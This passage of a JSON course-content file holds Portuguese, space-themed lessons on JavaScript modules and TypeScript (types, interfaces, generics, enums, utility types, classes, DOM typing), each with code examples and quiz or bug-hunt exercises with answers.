nomeadas para funções utilitárias: elas facilitam a autocompletação nas IDEs e melhoram a otimização de eliminação de código morto (*tree-shaking*).\n\n> **🛡️ Regra de Ouro:**\n> Módulos executam em modo estrito (`\"use strict\"`) por padrão, prevenindo criação de variáveis globais acidentais.",
        "codeExample": "// modulo-bateria.js\nexport const CAPACIDADE_MAXIMA = 10000;\n\nexport function calcularPorcentagem(cargaAtual) {\n  return Math.round((cargaAtual / CAPACIDADE_MAXIMA) * 100);\n}\n\nexport default class Reator {\n  constructor() {\n    this.ativo = true;\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a principal diferença entre um Named Export (export const x) e um Default Export (export default x)?",
            "options": [
              "O named export só funciona para números inteiros, enquanto o default export aceita objetos.",
              "Um arquivo pode ter vários named exports mas apenas um default export, e na importação o named export exige o uso de chaves {}.",
              "O default export é executado antes do restante da aplicação ser baixada pelo navegador.",
              "O named export expõe as variáveis diretamente para o escopo global do window."
            ],
            "correctIndex": 1,
            "explanation": "Um módulo pode ter múltiplos named exports (importados com chaves { nome }) e no máximo um default export (importado sem chaves com qualquer nome escolhido)."
          },
          {
            "type": "bughunt",
            "title": "Correção de Importação de Named Exports",
            "scenario": "Um cadete tentou importar funções nomeadas sem utilizar as chaves obrigatórias. Corrija o comando de importação.",
            "buggyCode": "import calcularDistancia, velocidadeLuz from \"./fisica.js\";",
            "expectedKeywords": [
              "import { calcularDistancia, velocidadeLuz } from \"./fisica.js\";"
            ],
            "forbiddenKeywords": [
              "import calcularDistancia, velocidadeLuz from"
            ],
            "hint": "Adicione as chaves { } em volta das funções exportadas com named export.",
            "solutionExplanation": "Exportações nomeadas devem ser desestruturadas com chaves: import { calcularDistancia, velocidadeLuz } from \"./fisica.js\";"
          }
        ]
      }
    ]
  },
  {
    "id": "typescript",
    "slug": "typescript",
    "name": "TypeScript",
    "planetName": "Quantum Station",
    "description": "Adicione blindagem estática de tipos e segurança corporativa ao JavaScript.",
    "icon": "🔷",
    "color": "#3178C6",
    "language": "typescript",
    "level": "Intermediário",
    "totalXp": 520,
    "lessons": [
      {
        "id": "ts-1",
        "title": "1. O Escudo dos Tipos: Primitivos & Funções",
        "description": "Elimine bugs antes mesmo de rodar o código com tipagem estática e inferência.",
        "duration": 15,
        "xpReward": 60,
        "language": "typescript",
        "content": "# 🔷 O Escudo dos Tipos: Primitivos & Funções\n\nBem-vindo à **Quantum Station**, cadete! No vasto cosmos do software, um dos maiores causadores de catástrofes em produção é o famoso `TypeError: undefined is not a function`.\n\nO **TypeScript** é um superset do JavaScript desenvolvido pela Microsoft que adiciona uma camada de **blindagem estática de tipos**.\n\n> **💡 O que é TypeScript?**\n> O TypeScript não substitui o JavaScript — ele o envolve com um sistema de checagem em tempo de desenvolvimento. Antes do seu código ir para o ar, o compilador verifica cada variável, função e objeto. Se houver incompatibilidade, você descobre no editor, não na frente do usuário!\n\n---\n\n### 🛡️ Tipagem Primitiva Explícita\n\n```typescript\nconst nomeNave: string = \"USS Voyager\";\nlet tripulantes: number = 140;\nlet escudosAtivos: boolean = true;\n```\n\n---\n\n### ⚙️ Tipando Funções: Parâmetros & Retorno\n\nNo TypeScript, você define os tipos dos argumentos que entram e o tipo do valor que sai da função:\n\n```typescript\nfunction calcularPropulsao(velocidade: number, fatorDobra: number): number {\n  return velocidade * fatorDobra;\n}\n```\n\nSe a função apenas executa uma ação e não retorna nenhum valor, o tipo de retorno é `void`:\n\n```typescript\nfunction emitirAlerta(mensagem: string): void {\n  console.warn(`ALERTA: ${mensagem}`);\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar o tipo `any` desliga completamente a checagem do TypeScript! É como voar no espaço sem capacete. Evite `any` sempre que possível; prefira tipos explícitos ou `unknown`.\n\n> **🛡️ Boa Prática:**\n> O TypeScript possui **inferência de tipos**. Se você declarar `let pontuacao = 100;`, ele já sabe automaticamente que a variável é do tipo `number`. Não é necessário tipar o que é óbvio!",
        "codeExample": "// Sistema de Calibração da Quantum Station\nfunction autenticarOficial(id: string, nivelSeguranca: number): boolean {\n  if (nivelSeguranca >= 4) {\n    return true;\n  }\n  return false;\n}\n\nconst autorizado: boolean = autenticarOficial(\"CADETE-99\", 5);\nconsole.log(\"Acesso concedido:\", autorizado);",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que acontece com as anotações de tipo do TypeScript quando o código é compilado para ser executado em produção no navegador?",
            "options": [
              "São convertidas em funções de validação em tempo de execução que deixam a página mais lenta.",
              "São completamente removidas durante o processo de build, gerando JavaScript puro e limpo.",
              "São enviadas para um servidor remoto da Microsoft que valida cada requisição.",
              "São mantidas dentro de comentários invisíveis no HTML."
            ],
            "correctIndex": 1,
            "explanation": "O TypeScript é uma ferramenta de tempo de desenvolvimento. Na compilação (transpilação), todos os tipos são eliminados (\"type erasure\"), resultando em JavaScript padrão compatível com qualquer navegador."
          },
          {
            "type": "fillblank",
            "title": "Tipando a Missão Espacial",
            "instruction": "Preencha os tipos do parâmetro nivel (número) e do retorno da função (texto).",
            "codeSnippet": "function classificarPiloto(nivel: {{tipo_numero}}): {{tipo_retorno}} {\n  if (nivel >= 50) return \"Comandante\";\n  return \"Cadete\";\n}",
            "blanks": [
              {
                "id": "tipo_numero",
                "placeholder": "tipo numérico",
                "expectedValues": [
                  "number"
                ],
                "hint": "Palavra-chave em minúsculas que representa números no TypeScript."
              },
              {
                "id": "tipo_retorno",
                "placeholder": "tipo textual",
                "expectedValues": [
                  "string"
                ],
                "hint": "Palavra-chave que representa textos no TypeScript."
              }
            ],
            "explanation": "Excelente! A função agora tem contrato rígido: recebe um number e promete devolver uma string."
          },
          {
            "type": "bughunt",
            "title": "Incompatibilidade na Matriz de Coordenadas",
            "scenario": "O compilador acusou erro porque alguém passou uma string entre aspas onde a função esperava estritamente um número.",
            "buggyCode": "function ajustarOrbita(graus: number): void {\n  console.log(\"Órbita ajustada em\", graus, \"graus.\");\n}\n\n// Erro de tipo na chamada abaixo:\najustarOrbita(\"45\");",
            "expectedKeywords": [
              "ajustarOrbita(45);"
            ],
            "forbiddenKeywords": [
              "ajustarOrbita(\"45\");"
            ],
            "hint": "Remova as aspas ao redor do número 45 para que ele seja tratado como um número literal válido.",
            "solutionExplanation": "Perfeito! O valor 45 sem aspas é do tipo number, satisfazendo a assinatura exigida pela função."
          }
        ]
      },
      {
        "id": "ts-2",
        "title": "2. Interfaces & Modelagem Quântica",
        "description": "Defina a forma dos seus objetos com interfaces, propriedades opcionais e Union Types.",
        "duration": 16,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🧬 Interfaces & Modelagem Quântica\n\nConforme seus sistemas crescem, você precisará modelar entidades complexas: usuários, naves espaciais, planos de voo. No TypeScript, usamos **interfaces** como contratos de arquitetura.\n\n---\n\n### 🏛️ Criando uma Interface\n\nUma `interface` declara quais propriedades um objeto deve possuir e de que tipo elas são:\n\n```typescript\ninterface CadeteEspacial {\n  id: string;\n  nome: string;\n  nivel: number;\n  ativo: boolean;\n  moduloEspecial?: string; // Propriedade opcional com \"?\"\n}\n```\n\n---\n\n### ❓ Propriedades Opcionais (`?`)\n\nNem todo objeto possui todos os campos o tempo todo. Ao adicionar um ponto de interrogação antes dos dois pontos (`?`), você torna o campo opcional:\n\n```typescript\nconst novoCadete: CadeteEspacial = {\n  id: \"C-101\",\n  nome: \"Lucas\",\n  nivel: 1,\n  ativo: true\n  // moduloEspecial não é obrigatório aqui!\n};\n```\n\n---\n\n### 🔀 Union Types: Restringindo Valores Possíveis\n\nEm vez de permitir qualquer texto, você pode criar uma união estrita de opções:\n\n```typescript\ntype StatusMissao = \"PENDENTE\" | \"EM_PROGRESSO\" | \"CONCLUIDA\" | \"FALHA\";\n\nlet statusAtual: StatusMissao = \"PENDENTE\";\n// statusAtual = \"CANCELADA\"; // ERRO! Não faz parte do tipo!\n```\n\n> **💡 Dica Pro:**\n> Use interfaces para definir a estrutura de objetos e modelos de dados da sua aplicação. Elas suportam extensão (`extends`) para herança limpa entre tipos.\n\n> **⚠️ Armadilha Comum:**\n> Tentar instanciar um objeto esquecendo uma propriedade obrigatória da interface gerará um erro do compilador antes mesmo de você rodar o projeto.",
        "codeExample": "// Modelagem de Veículo Espacial\ninterface NaveExploracao {\n  codigo: string;\n  capacidadeTripulantes: number;\n  escudoAtivo: boolean;\n  armaSecundaria?: string;\n}\n\nconst navePrincipal: NaveExploracao = {\n  codigo: \"NEXUS-PRIME\",\n  capacidadeTripulantes: 8,\n  escudoAtivo: true\n};\n\nconsole.log(\"Nave pronta:\", navePrincipal.codigo);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual o significado do ponto de interrogação (?) após o nome de uma propriedade em uma interface TypeScript (ex: telefone?: string)?",
            "options": [
              "Indica que a propriedade é secreta e criptografada no banco de dados.",
              "Indica que a propriedade é opcional, podendo estar ausente no objeto.",
              "Indica que a propriedade aceita qualquer tipo de dado arbitrário.",
              "Indica que a propriedade só pode ser lida, mas nunca alterada."
            ],
            "correctIndex": 1,
            "explanation": "O operador ? marca a propriedade como opcional, significando que o objeto pode ser instanciado validamente com ou sem aquele campo."
          },
          {
            "type": "code",
            "instruction": "Defina uma interface chamada ModuloNave com as propriedades obrigatórias id (string), potencia (number) e ativa (boolean).",
            "initialCode": "// Defina a interface abaixo\n",
            "expectedKeywords": [
              "interface ModuloNave",
              "id: string",
              "potencia: number",
              "ativa: boolean"
            ],
            "hint": "Inicie com interface ModuloNave {. Em seguida adicione id: string;, potencia: number; e ativa: boolean;.",
            "solution": "interface ModuloNave {\n  id: string;\n  potencia: number;\n  ativa: boolean;\n}"
          }
        ]
      },
      {
        "id": "ts-3",
        "title": "3. Union Types, Type Aliases & Narrowing",
        "description": "Crie tipos compostos flexíveis e seguros utilizando uniões (|), apelidos (type) e narrowing com typeof.",
        "duration": 15,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🛡️ Union Types, Type Aliases & Narrowing\n\nBem-vindo ao terceiro quadrante da Quantum Station! Na física quântica e no código seguro, nem tudo é preto no branco; variáveis podem assumir múltiplos estados válidos.\n\n> **💡 O que são Union Types?**\n> Um Union Type (`|`) permite que uma variável contenha valores de dois ou mais tipos distintos. Em vez de recorrer ao perigoso `any`, você define explicitamente os únicos tipos permitidos.\n\n---\n\n### 🔀 Uniões e Type Aliases\n\nDefina apelidos reutilizáveis com a palavra-chave `type`:\n\n```typescript\ntype StatusMissao = 'pendente' | 'em_andamento' | 'concluida' | 'abortada';\ntype Identificador = string | number;\n\nfunction atualizarStatus(id: Identificador, status: StatusMissao): void {\n  console.log(`Missão ${id} alterada para: ${status}`);\n}\n```\n\n---\n\n### 🔍 Estreitamento de Tipos (Type Narrowing)\n\nQuando uma variável aceita uma união, você precisa \"estreitar\" o tipo antes de acessar propriedades específicas:\n\n```typescript\nfunction formatarIdentificador(id: string | number): string {\n  // TypeScript estreita o tipo dentro do if!\n  if (typeof id === 'string') {\n    return id.toUpperCase();\n  }\n  return id.toFixed(2);\n}\n```\n\n- **Type Guards comuns:** `typeof`, `instanceof`, `in` e verificações literais de igualdade.\n\n> **⚠️ Armadilha Comum:**\n> Tentar chamar métodos específicos de um tipo sem verificar antes (ex: chamar `id.toUpperCase()` direto sem o `if`). O compilador do TypeScript emitirá um erro impedindo a compilação!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use uniões de literais de string em vez de strings genéricas para restringir valores a um conjunto fechado e seguro.\n- Utilize Type Aliases para dar nomes compreensíveis a tipos complexos ou uniões longas.\n\n> **🛡️ Regra de Ouro:**\n> Nunca use `any` para escapar de checagens de tipo. Se múltiplos tipos são possíveis, declare um Union Type e use Narrowing!",
        "codeExample": "type NivelAcesso = 'cadete' | 'comandante' | 'almirante';\n\ninterface UsuarioEstelar {\n  id: string | number;\n  nome: string;\n  acesso: NivelAcesso;\n}\n\nfunction autorizarComando(usuario: UsuarioEstelar): boolean {\n  return usuario.acesso === 'comandante' || usuario.acesso === 'almirante';\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual operador é utilizado no TypeScript para criar uma união de tipos (Union Type)?",
            "options": [
              "& (E comercial)",
              "| (Barra vertical)",
              "|| (Operador OU lógico)",
              "? (Interrogação)"
            ],
            "correctIndex": 1,
            "explanation": "O caractere | (pipe) indica união de tipos (ex: string | number)."
          },
          {
            "type": "code",
            "instruction": "Crie um Type Alias chamado \"ResultadoOperacao\" que possa ser o literal 'sucesso' OU o literal 'falha'.",
            "initialCode": "// Defina o type ResultadoOperacao aqui\n",
            "expectedKeywords": [
              "type ResultadoOperacao =",
              "'sucesso'",
              "|",
              "'falha'"
            ],
            "hint": "Use a sintaxe: type ResultadoOperacao = 'sucesso' | 'falha';",
            "solution": "type ResultadoOperacao = 'sucesso' | 'falha';"
          }
        ]
      },
      {
        "id": "ts-4",
        "title": "4. Generics: Componentes & Funções Reutilizáveis",
        "description": "Escreva funções e estruturas genéricas ultra flexíveis com parâmetros de tipo <T> fortemente tipados.",
        "duration": 16,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🧬 Generics: Componentes & Funções Reutilizáveis\n\nAvançando pelos laboratórios de Quantum Station! Criar código que funcione com múltiplos tipos sem perder a segurança da tipagem é a especialidade dos **Generics**.\n\n> **💡 O que é um Generic (<T>)?**\n> Um Generic é uma \"variável de tipo\". Assim como parâmetros de função recebem valores dinâmicos em tempo de execução, os Generics recebem tipos dinâmicos em tempo de compilação!\n\n---\n\n### 🛠️ Funções Genéricas na Prática\n\nConsidere uma função que recupera o primeiro elemento de qualquer lista:\n\n```typescript\nfunction primeiroElemento<T>(lista: T[]): T | undefined {\n  return lista[0];\n}\n\nconst naves = ['Orion', 'Apollo', 'Discovery'];\nconst primeiraNave = primeiroElemento(naves); // Tipo inferido: string!\n\nconst codigos = [101, 202, 303];\nconst primeiroCodigo = primeiroElemento(codigos); // Tipo inferido: number!\n```\n\n- **`<T>`**: É o parâmetro de tipo (por convenção usa-se T de *Type*).\n- O TypeScript preserva a relação exata entre o tipo de entrada e o tipo de retorno, sem descer ao nível do perigoso `any`!\n\n---\n\n### 📦 Interfaces e Tipos Genéricos\n\nMuito utilizado em respostas de API da frota:\n\n```typescript\ninterface RespostaApi<T> {\n  sucesso: boolean;\n  dados: T;\n  timestamp: string;\n}\n\ntype RespostaNave = RespostaApi<{ id: string; propulsores: number }>;\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar Generics desnecessariamente em funções que só lidam com um tipo específico. Use Generics apenas quando o tipo for verdadeiramente variável e dinâmico.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Você pode restringir tipos genéricos usando restrições com a palavra-chave `extends` (ex: `<T extends { id: string }>`).\n- Dê nomes significativos aos parâmetros de tipos genéricos se tiver mais de um (ex: `<TChave, TValor>`).\n\n> **🛡️ Regra de Ouro:**\n> Generics eliminam duplicidade de código mantendo 100% da verificação estática de tipos do compilador.",
        "codeExample": "interface CaixaQuantica<T> {\n  conteudo: T;\n  abrir: () => T;\n}\n\nfunction empacotar<T>(item: T): CaixaQuantica<T> {\n  return {\n    conteudo: item,\n    abrir: () => item\n  };\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o principal benefício de utilizar Generics em vez de \"any\" em funções reutilizáveis?",
            "options": [
              "Generics aumentam o tamanho final do arquivo JavaScript em 50%.",
              "Generics preservam a informação exata do tipo e o autocompletar da IDE sem comprometer a segurança da tipagem.",
              "Generics eliminam a necessidade de compilar o código TypeScript.",
              "Generics forçam a função a executar exclusivamente em threads secundárias."
            ],
            "correctIndex": 1,
            "explanation": "Generics capturam o tipo específico fornecido na invocação e mantêm a integridade de verificação em tempo de compilação."
          },
          {
            "type": "fillblank",
            "title": "Criando uma Função Genérica Simples",
            "instruction": "Preencha as lacunas com o parâmetro de tipo genérico T.",
            "codeSnippet": "function clonarItem<___>(item: ___): ___ {\n  return { ...item };\n}",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "parâmetro genérico",
                "expectedValues": [
                  "T"
                ],
                "hint": "A letra padrão utilizada por convenção em Generics."
              },
              {
                "id": "blank-2",
                "placeholder": "tipo do parâmetro",
                "expectedValues": [
                  "T"
                ],
                "hint": "O mesmo parâmetro de tipo declarado entre os colchetes angulares."
              },
              {
                "id": "blank-3",
                "placeholder": "tipo de retorno",
                "expectedValues": [
                  "T"
                ],
                "hint": "A função devolve um item com o mesmo tipo que recebeu."
              }
            ],
            "explanation": "A sintaxe <T>(item: T): T vincula o tipo de entrada ao tipo de saída mantendo a segurança estática."
          }
        ]
      },
      {
        "id": "ts-5",
        "title": "5. Enums & Literais Estritos",
        "description": "Padronize conjuntos finitos de valores e constantes estelares usando numeric e string enums e const assertions.",
        "duration": 15,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🏷️ Enums & Literais Estritos\n\nOrganização no setor de navegação de Quantum Station! Quando um sistema possui um conjunto bem definido de opções (como pontos cardeais, níveis de severidade ou estados de reator), usamos **Enums** e **Literais**.\n\n> **💡 O que é um Enum?**\n> Um `enum` permite definir um conjunto de constantes nomeadas legíveis. No TypeScript moderno, existem enums numéricos e enums de strings.\n\n---\n\n### 🔠 String Enums na Prática\n\n```typescript\nenum PlanetaSetor {\n  TerraDigital = 'TERRA_DIGITAL',\n  NeonCity = 'NEON_CITY',\n  CyberCore = 'CYBER_CORE',\n  QuantumStation = 'QUANTUM_STATION'\n}\n\nfunction navegarPara(setor: PlanetaSetor): void {\n  console.log(`Hiperpropulsão ativada para o setor: ${setor}`);\n}\n\nnavegarPara(PlanetaSetor.CyberCore);\n```\n\n- **Vantagem de String Enums:** Durante a depuração no console, você vê o valor legível `\"CYBER_CORE\"` em vez de números misteriosos como `0` ou `1`.\n\n---\n\n### 🔒 Alternativa Moderna: `as const` (Const Assertions)\n\nMuitos engenheiros seniores modernos preferem objetos imutáveis com `as const`:\n\n```typescript\nconst DIRECOES = {\n  NORTE: 'N',\n  SUL: 'S',\n  LESTE: 'L',\n  OESTE: 'O'\n} as const;\n\ntype Direcao = typeof DIRECOES[keyof typeof DIRECOES]; // 'N' | 'S' | 'L' | 'O'\n```\n\nEsta técnica evita a emissão de código JavaScript extra e produz tipos literais puros.\n\n> **⚠️ Armadilha Comum:**\n> Modificar valores de um enum em tempo de execução. Enums devem ser tratados estritamente como constantes imutáveis.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Prefira sempre String Enums a Numeric Enums: eles são autodocumentados nos logs de erro.\n- Se você não precisa iterar sobre as chaves no JavaScript final, uniões de strings literais (`type Modo = 'turbo' | 'eco'`) costumam ser mais leves.\n\n> **🛡️ Regra de Ouro:**\n> Nunca deixe valores \"mágicos\" soltos no código (`if (tipo === 3)`). Nomeie-os através de um enum ou constante tipada.",
        "codeExample": "enum SeveridadeAlerta {\n  Baixa = 'BAIXA',\n  Media = 'MEDIA',\n  Critica = 'CRITICA'\n}\n\nfunction emitirAlarme(nivel: SeveridadeAlerta) {\n  if (nivel === SeveridadeAlerta.Critica) {\n    console.warn('ALERTA VERMELHO: Escudos em perigo!');\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a principal vantagem de usar String Enums (ex: Modo = \"ECO\") em comparação a Numeric Enums?",
            "options": [
              "String enums rodam 10 vezes mais rápido na máquina virtual.",
              "String enums imprimem valores semânticos compreensíveis em logs e consoles, facilitando a depuração.",
              "String enums podem ser alterados dinamicamente em tempo de execução.",
              "Numeric enums são proibidos pelo padrão ECMAScript."
            ],
            "correctIndex": 1,
            "explanation": "String enums fornecem serialização legível e facilitam o rastreamento em logs e diagnósticos de rede."
          },
          {
            "type": "code",
            "instruction": "Declare um enum chamado \"StatusReator\" com duas chaves: Online com valor \"ONLINE\" e Offline com valor \"OFFLINE\".",
            "initialCode": "// Crie o enum StatusReator aqui\n",
            "expectedKeywords": [
              "enum StatusReator",
              "Online = 'ONLINE'",
              "Offline = 'OFFLINE'"
            ],
            "hint": "Use: enum StatusReator { Online = 'ONLINE', Offline = 'OFFLINE' }",
            "solution": "enum StatusReator {\n  Online = 'ONLINE',\n  Offline = 'OFFLINE'\n}"
          }
        ]
      },
      {
        "id": "ts-6",
        "title": "6. Utility Types Essenciais (Partial, Pick, Omit)",
        "description": "Transforme tipos existentes de forma rápida e elegante usando as ferramentas de utilidade nativas do TypeScript.",
        "duration": 16,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🧰 Utility Types Essenciais (Partial, Pick, Omit)\n\nManutenção de sistemas em Quantum Station! Em grandes projetos, você não precisa recriar interfaces do zero quando precisa de uma variação delas. O TypeScript oferece **Utility Types** embutidos que transformam tipos existentes instantaneamente.\n\n> **💡 O que são Utility Types?**\n> São utilitários globais de transformação de tipos que recebem uma interface existente e geram automaticamente uma nova versão dela com regras modificadas.\n\n---\n\n### 🛠️ Os Utilitários Mais Usados\n\n1. **`Partial<T>`**: Torna **todas** as propriedades do tipo opcionais (adiciona `?`). Ideal para funções de atualização (`PATCH`):\n```typescript\ninterface Cadete {\n  id: string;\n  nome: string;\n  patente: string;\n  xp: number;\n}\n\n// Todas as propriedades viram opcionais!\nfunction atualizarCadete(id: string, mudancas: Partial<Cadete>) {\n  // mudancas pode conter apenas { xp: 500 } sem reclamar dos outros campos!\n}\n```\n\n2. **`Pick<T, Chaves>`**: Seleciona apenas um subconjunto específico de propriedades:\n```typescript\n// Contém apenas 'id' e 'nome'\ntype ResumoCadete = Pick<Cadete, 'id' | 'nome'>;\n```\n\n3. **`Omit<T, Chaves>`**: Remove propriedades indesejadas (o inverso de Pick):\n```typescript\n// Contém 'nome', 'patente' e 'xp', omitindo o 'id'\ntype NovoCadetePayload = Omit<Cadete, 'id'>;\n```\n\n4. **`Readonly<T>`**: Torna todas as propriedades somente leitura (impede reatribuições).\n\n> **⚠️ Armadilha Comum:**\n> Criar interfaces duplicadas manualmente (como `CadeteSemId`, `CadeteAtualizacao`) em vez de derivá-las com Utility Types. Quando a interface original muda, as manuais ficam desatualizadas e quebram a consistência!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Combine `Pick` e `Omit` para criar DTOs (*Data Transfer Objects*) de formulários e requisições HTTP a partir de entidades centrais do banco.\n- Use `Readonly<T>` em estados globais para garantir imutabilidade em tempo de compilação.\n\n> **🛡️ Regra de Ouro:**\n> Mantenha uma única fonte de verdade (*Single Source of Truth*) para seus modelos de dados e derive o restante com Utility Types.",
        "codeExample": "interface Nave {\n  id: string;\n  modelo: string;\n  blindagem: number;\n  armasAtivas: boolean;\n}\n\n// Perfeito para requisições de criação onde o id é gerado pelo banco\ntype CriarNaveDto = Omit<Nave, 'id'>;\n\n// Perfeito para atualizações parciais\ntype AtualizarNaveDto = Partial<Omit<Nave, 'id'>>;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual Utility Type do TypeScript transforma todas as propriedades de uma interface em opcionais?",
            "options": [
              "Required<T>",
              "Partial<T>",
              "Optional<T>",
              "Pick<T>"
            ],
            "correctIndex": 1,
            "explanation": "Partial<T> percorre todas as propriedades do tipo fornecido e adiciona a flag de opcionalidade ? a cada uma delas."
          },
          {
            "type": "code",
            "instruction": "Dado o tipo \"Perfil\" com { id: string; email: string; bio: string; }, crie um tipo \"PerfilPublico\" que omita a propriedade \"email\" usando Omit.",
            "initialCode": "interface Perfil {\n  id: string;\n  email: string;\n  bio: string;\n}\n// Crie o tipo PerfilPublico aqui\n",
            "expectedKeywords": [
              "type PerfilPublico =",
              "Omit<Perfil, 'email'>"
            ],
            "hint": "Use: type PerfilPublico = Omit<Perfil, 'email'>;",
            "solution": "interface Perfil {\n  id: string;\n  email: string;\n  bio: string;\n}\ntype PerfilPublico = Omit<Perfil, 'email'>;"
          }
        ]
      },
      {
        "id": "ts-7",
        "title": "7. Classes, Modificadores & Encapsulamento",
        "description": "Construa sistemas orientados a objetos robustos com public, private, protected e readonly.",
        "duration": 16,
        "xpReward": 65,
        "language": "typescript",
        "content": "# 🏛️ Classes, Modificadores & Encapsulamento\n\nArquitetura sólida na ponte de comando de Quantum Station! O TypeScript eleva as classes do JavaScript trazendo **modificadores de acesso** nativos que blindam métodos e propriedades contra acessos indevidos.\n\n> **💡 Modificadores de Acesso**\n> - **`public`** (padrão): Acessível de qualquer lugar.\n> - **`private`**: Acessível exclusivamente dentro da própria classe.\n> - **`protected`**: Acessível na classe e em suas subclasses derivadas.\n> - **`readonly`**: Pode ser lido, mas nunca alterado após a inicialização no construtor.\n\n---\n\n### 🚀 Parâmetros no Construtor (*Parameter Properties*)\n\nO TypeScript possui um atalho fantástico que elimina declarações repetitivas de propriedades:\n\n```typescript\nclass SensorEstelar {\n  // Atalho do TypeScript: declara e inicializa a propriedade em uma única linha!\n  constructor(\n    public readonly id: string,\n    private nivelCalibracao: number,\n    protected localizacao: string\n  ) {}\n\n  public lerDados(): string {\n    return `Sensor ${this.id} calibrado em ${this.nivelCalibracao}%`;\n  }\n}\n```\n\n---\n\n### 🛡️ Implementando Contratos com `implements`\n\nGaranta que uma classe cumpra à risca uma interface:\n\n```typescript\ninterface Autenticavel {\n  autenticar(codigo: string): boolean;\n}\n\nclass TerminalNave implements Autenticavel {\n  autenticar(codigo: string): boolean {\n    return codigo === 'NEXUS-2026';\n  }\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Lembrar que modificadores `private` do TypeScript são verificados apenas em tempo de compilação. Se você precisa de privacidade estrita em tempo de execução no JavaScript final, utilize os campos privados nativos com hash (`#propriedade`).\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Mantenha propriedades de estado interno sempre como `private` e exponha métodos de leitura ou alteração controlada (Getters / Setters).\n- Utilize `readonly` em identificadores únicos que nunca devam mudar após a criação do objeto.\n\n> **🛡️ Regra de Ouro:**\n> O encapsulamento adequado impede que outros módulos corrompam acidentalmente o estado interno dos seus serviços.",
        "codeExample": "class ModuloDefesa {\n  private escudos: number = 100;\n\n  constructor(public readonly nomeSetor: string) {}\n\n  public sofrerDano(dano: number): void {\n    this.escudos = Math.max(0, this.escudos - dano);\n  }\n\n  public get nivelEscudos(): number {\n    return this.escudos;\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual modificador de acesso permite que uma propriedade seja acessada dentro da própria classe e por classes que herdam dela, mas não fora delas?",
            "options": [
              "private",
              "protected",
              "public",
              "internal"
            ],
            "correctIndex": 1,
            "explanation": "O modificador protected permite acesso na própria classe e em suas classes filhas (herança), mantendo-se inacessível fora dessa hierarquia."
          },
          {
            "type": "code",
            "instruction": "Crie uma classe \"Reator\" com um construtor que receba e inicialize automaticamente uma propriedade pública e somente leitura \"codigo\" do tipo string.",
            "initialCode": "// Crie a classe Reator aqui\n",
            "expectedKeywords": [
              "class Reator",
              "constructor(",
              "public readonly codigo: string"
            ],
            "hint": "Use a sintaxe abreviada: constructor(public readonly codigo: string) {}",
            "solution": "class Reator {\n  constructor(public readonly codigo: string) {}\n}"
          }
        ]
      },
      {
        "id": "ts-8",
        "title": "8. Tipagem Avançada do DOM e Eventos",
        "description": "Interaja com o navegador sem falhas de runtime tipando elementos HTML, eventos e asserções de tipo seguras.",
        "duration": 17,
        "xpReward": 70,
        "language": "typescript",
        "content": "# 🌐 Tipagem Avançada do DOM e Eventos\n\nMissão final em Quantum Station! Quando conectamos o TypeScript com o navegador, precisamos manipular elementos do DOM garantindo que o compilador saiba exatamente qual elemento HTML estamos manipulando.\n\n> **💡 A Hierarquia de Tipos do DOM**\n> O TypeScript inclui definições completas de todos os nós do navegador:\n> - `Element`: Elemento genérico.\n> - `HTMLElement`: Qualquer elemento HTML.\n> - `HTMLInputElement`, `HTMLButtonElement`, `HTMLFormElement`: Tipos específicos com suas propriedades exclusivas (como `.value` ou `.disabled`).\n\n---\n\n### 🎯 Asserções de Tipo com `as` e Verificações Nulas\n\nPor padrão, `document.querySelector` pode retornar `null` e seu tipo é genérico:\n\n```typescript\nconst inputBusca = document.querySelector<HTMLInputElement>('#campo-busca');\n\nif (inputBusca) {\n  // TypeScript reconhece inputBusca como HTMLInputElement!\n  console.log(inputBusca.value);\n}\n```\n\n- **Genérico no querySelector:** `document.querySelector<HTMLButtonElement>('.meu-botao')`.\n- Sempre verifique se o elemento não é `null` antes de acessá-lo!\n\n---\n\n### 🖱️ Tipando Eventos do Navegador\n\nEventos de formulários e cliques possuem tipos específicos:\n\n```typescript\nconst form = document.querySelector<HTMLFormElement>('#form-login');\n\nform?.addEventListener('submit', (evento: SubmitEvent) => {\n  evento.preventDefault();\n  console.log('Formulário interceptado com tipagem segura!');\n});\n\nfunction lidarComDigitacao(evento: React.ChangeEvent<HTMLInputElement> | Event) {\n  const alvo = evento.target as HTMLInputElement;\n  console.log(alvo.value);\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar o operador de asserção não-nula (`!`) de forma imprudente (ex: `document.querySelector('#x')!`). Se o elemento não existir no HTML por um erro de digitação, a aplicação quebrará com erro em tempo de execução!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Prefira a sintaxe genérica `querySelector<T>()` em vez de fazer casting com `as T` depois.\n- Trate sempre a possibilidade do elemento não ter sido encontrado no DOM com condicionais simples (`if (elem) ...`).\n\n> **🛡️ Regra de Ouro:**\n> O DOM é um ambiente dinâmico externo; validar existência e tipos específicos de elementos é o segredo de uma aplicação à prova de falhas.",
        "codeExample": "const botaoDisparo = document.querySelector<HTMLButtonElement>('#btn-disparo');\n\nbotaoDisparo?.addEventListener('click', (ev: MouseEvent) => {\n  console.log(`Clique registrado nas coordenadas (${ev.clientX}, ${ev.clientY})`);\n});",
        "exercises": [
          {
            "type": "quiz",
